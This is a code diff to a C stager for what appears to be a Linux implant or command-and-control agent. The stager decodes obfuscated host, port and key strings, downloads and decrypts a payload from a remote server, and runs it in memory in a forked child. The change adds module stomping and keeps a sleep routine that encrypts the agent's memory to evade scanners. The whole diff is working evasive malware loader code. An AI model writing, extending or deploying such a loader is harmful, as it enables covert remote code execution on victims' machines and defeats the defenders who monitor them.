@@ -88,12 +88,19 @@ void stager_main(long *sp) {
   char port[16];
   char path[256];
   char key_str[256];
+  char module_path[256] = {0}; // Optional module path for stomping
   uint8_t key[16];
 
   decode_config_string(host, encoded_host, sizeof(host));
   decode_config_string(port, encoded_port, sizeof(port));
   decode_config_string(path, encoded_path, sizeof(path));
   decode_config_string(key_str, encoded_key, sizeof(key_str));
+  
+  // Use a default empty string if encoded_module_path is not defined or valid
+  #ifdef ENCODED_MODULE_PATH
+  static const unsigned char encoded_module_path[] = {ENCODED_MODULE_PATH};
+  decode_config_string(module_path, encoded_module_path, sizeof(module_path));
+  #endif
 
   derive_key_from_string(key_str, key);
 
@@ -108,6 +115,7 @@ void stager_main(long *sp) {
 
   DEBUG_PRINT("Starting stager...\n");
   DEBUG_PRINT("Host: %s, Port: %s, Path: %s\n", host, port, path);
+  DEBUG_PRINT("Module Path: %s\n", module_path);
 
   // Try to download
   size_t downloaded_size = download_file(host, port, path, key, &payload);
@@ -126,96 +134,138 @@ void stager_main(long *sp) {
     }
     DEBUG_PRINT("Payload built successfully, size: %d\n", (int)final_size);
 
-    // 2. Get ELF executable bounds
-    size_t min_vaddr = 0, max_vaddr = 0;
-    if (elf_get_memory_bounds(final_payload, &min_vaddr, &max_vaddr) != 0) {
-      DEBUG_PRINT("Failed to get ELF memory bounds\n");
-      exit(1);
-    }
-    size_t map_len = max_vaddr - min_vaddr;
-    DEBUG_PRINT("Mapping shared memory: 0x%lx - 0x%lx (%d bytes)\n", min_vaddr, max_vaddr, (int)map_len);
-
-    // 3. Create shared memory mapping for the child process
-    void *shared_mem = mmap((void *)min_vaddr, map_len,
-                            PROT_READ | PROT_WRITE | PROT_EXEC,
-                            MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
-    if (shared_mem == MAP_FAILED) {
-        DEBUG_PRINT("Failed to map shared memory at 0x%lx\n", min_vaddr);
-        exit(1);
-    }
-
-    // 4. Fork and Run (No environment variable injection)
-    DEBUG_PRINT("Forking child process...\n");
-    long pid = fork();
-    if (pid == 0) {
-      // Child process
-      // Load and run the ELF in the pre-mapped shared memory
-      elf_run(final_payload, argv, envp, 1);
-      exit(0);
-    } else if (pid > 0) {
-      // Parent process
-      // Free the decrypted payload to clean up
-      free(final_payload);
-
-      // Wait loop
-      uint8_t rotator_key[16] = {0};
-      int status = 0;
-      
-      while (1) {
-        long res = waitpid((int)pid, &status, WUNTRACED);
-        
-        if (res == pid) {
-            if (WIFEXITED(status) || WIFSIGNALED(status)) {
-                DEBUG_PRINT("Child exited with status %d\n", status);
-                break; // Exit stager if child dies
-            }
-
-            if (WIFSTOPPED(status)) {
-                int sig = WSTOPSIG(status);
-                DEBUG_PRINT("Child stopped by signal %d\n", sig);
+    // 2. Check if Payload is PIE or Static
+    Elf_Ehdr *hdr = (Elf_Ehdr *)final_payload;
+    if (hdr->e_type == ET_DYN) {
+        DEBUG_PRINT("Detected PIE payload (ET_DYN). Skipping shared memory rotation.\n");
+        // For PIE, we fork and let elf_loader handle mmap/stomping (pre_mapped=0)
+        long pid = fork();
+        if (pid == 0) {
+            // Child
+            elf_run(final_payload, argv, envp, 0, module_path);
+            exit(0);
+        } else if (pid > 0) {
+            // Parent
+            free(final_payload);
+            int status = 0;
+            while (1) {
+                long res = waitpid((int)pid, &status, WUNTRACED);
+                if (res == pid) {
+                    if (WIFEXITED(status) || WIFSIGNALED(status)) {
+                        DEBUG_PRINT("Child exited with status %d\n", status);
+                        break;
+                    }
+                    if (WIFSTOPPED(status)) {
+                         // Just resume if stopped, rotation not supported for PIE yet
+                         kill((int)pid, SIGCONT);
+                    }
+                }
                 
-                if (sig == SIGSTOP) {
-                    DEBUG_PRINT("Agent suspended. Encrypting memory...\n");
-                    
-                    // Generate new key
-                    getrandom(rotator_key, 16, 0);
-                    
-                    // Encrypt the shared memory (in-place)
-                    xor_payload((char *)shared_mem, map_len, rotator_key, 16);
-                    
-                    // Sleep time (3-8 minutes)
-                    unsigned int sleep_s = 0;
-                    getrandom(&sleep_s, sizeof(sleep_s), 0);
-                    sleep_s = 180 + (sleep_s % 300);
-                    DEBUG_PRINT("Sleeping %d seconds...\n", sleep_s);
-                    
-                    struct timespec req;
-                    req.tv_sec = sleep_s;
-                    req.tv_nsec = 0;
-                    nanosleep(&req, NULL);
-                    
-                    DEBUG_PRINT("Waking up. Decrypting memory...\n");
-                    xor_payload((char *)shared_mem, map_len, rotator_key, 16);
-                    
-                    DEBUG_PRINT("Resuming child...\n");
-                    kill((int)pid, SIGCONT);
-                } else {
-                     kill((int)pid, SIGCONT);
+                // Check for our own termination via indicator
+                if (g_trap_requested) {
+                     DEBUG_PRINT("Indicator offline trap received, killing child %d\n", (int)pid);
+                     kill((int)pid, SIGKILL);
+                     break;
                 }
             }
+        } else {
+             DEBUG_PRINT("Fork failed\n");
+             exit(1);
         }
-        
-        // Check for our own termination?
-        if (g_trap_requested) {
-             DEBUG_PRINT("Indicator offline trap received, killing child %d\n", (int)pid);
-             kill((int)pid, SIGKILL);
-             waitpid((int)pid, &status, 0);
-             break;
-        }
-      }
+
     } else {
-      DEBUG_PRINT("Fork failed\n");
-      exit(1);
+        DEBUG_PRINT("Detected Static payload (ET_EXEC). Using shared memory rotation.\n");
+        // 2b. Get ELF executable bounds
+        size_t min_vaddr = 0, max_vaddr = 0;
+        if (elf_get_memory_bounds(final_payload, &min_vaddr, &max_vaddr) != 0) {
+          DEBUG_PRINT("Failed to get ELF memory bounds\n");
+          exit(1);
+        }
+        size_t map_len = max_vaddr - min_vaddr;
+        DEBUG_PRINT("Mapping shared memory: 0x%lx - 0x%lx (%d bytes)\n", min_vaddr, max_vaddr, (int)map_len);
+
+        // 3. Create shared memory mapping for the child process
+        void *shared_mem = (void *)mmap((void *)min_vaddr, map_len,
+                                PROT_READ | PROT_WRITE | PROT_EXEC,
+                                MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+        if (shared_mem == MAP_FAILED) {
+            DEBUG_PRINT("Failed to map shared memory at 0x%lx\n", min_vaddr);
+            exit(1);
+        }
+
+        // 4. Fork and Run
+        DEBUG_PRINT("Forking child process...\n");
+        long pid = fork();
+        if (pid == 0) {
+          // Child process
+          // Load and run the ELF in the pre-mapped shared memory
+          elf_run(final_payload, argv, envp, 1, module_path);
+          exit(0);
+        } else if (pid > 0) {
+          // Parent process
+          // Free the decrypted payload to clean up
+          free(final_payload);
+
+          // Wait loop
+          uint8_t rotator_key[16] = {0};
+          int status = 0;
+          
+          while (1) {
+            long res = waitpid((int)pid, &status, WUNTRACED);
+            
+            if (res == pid) {
+                if (WIFEXITED(status) || WIFSIGNALED(status)) {
+                    DEBUG_PRINT("Child exited with status %d\n", status);
+                    break; // Exit stager if child dies
+                }
+
+                if (WIFSTOPPED(status)) {
+                    int sig = WSTOPSIG(status);
+                    DEBUG_PRINT("Child stopped by signal %d\n", sig);
+                    
+                    if (sig == SIGSTOP) {
+                        DEBUG_PRINT("Agent suspended. Encrypting memory...\n");
+                        
+                        // Generate new key
+                        getrandom(rotator_key, 16, 0);
+                        
+                        // Encrypt the shared memory (in-place)
+                        xor_payload((char *)shared_mem, map_len, rotator_key, 16);
+                        
+                        // Sleep time (3-8 minutes)
+                        unsigned int sleep_s = 0;
+                        getrandom(&sleep_s, sizeof(sleep_s), 0);
+                        sleep_s = 180 + (sleep_s % 300);
+                        DEBUG_PRINT("Sleeping %d seconds...\n", sleep_s);
+                        
+                        struct timespec req;
+                        req.tv_sec = sleep_s;
+                        req.tv_nsec = 0;
+                        nanosleep(&req, NULL);
+                        
+                        DEBUG_PRINT("Waking up. Decrypting memory...\n");
+                        xor_payload((char *)shared_mem, map_len, rotator_key, 16);
+                        
+                        DEBUG_PRINT("Resuming child...\n");
+                        kill((int)pid, SIGCONT);
+                    } else {
+                         kill((int)pid, SIGCONT);
+                    }
+                }
+            }
+            
+            // Check for our own termination?
+            if (g_trap_requested) {
+                 DEBUG_PRINT("Indicator offline trap received, killing child %d\n", (int)pid);
+                 kill((int)pid, SIGKILL);
+                 waitpid((int)pid, &status, 0);
+                 break;
+            }
+          }
+        } else {
+          DEBUG_PRINT("Fork failed\n");
+          exit(1);
+        }
     }
   } else {
     DEBUG_PRINT("Download failed\n");
@@ -223,6 +273,7 @@ void stager_main(long *sp) {
 
   exit(0);
 }
+
 
 // Decode XOR-obfuscated config string at runtime
 static void decode_config_string(char *dest, const unsigned char *encoded,
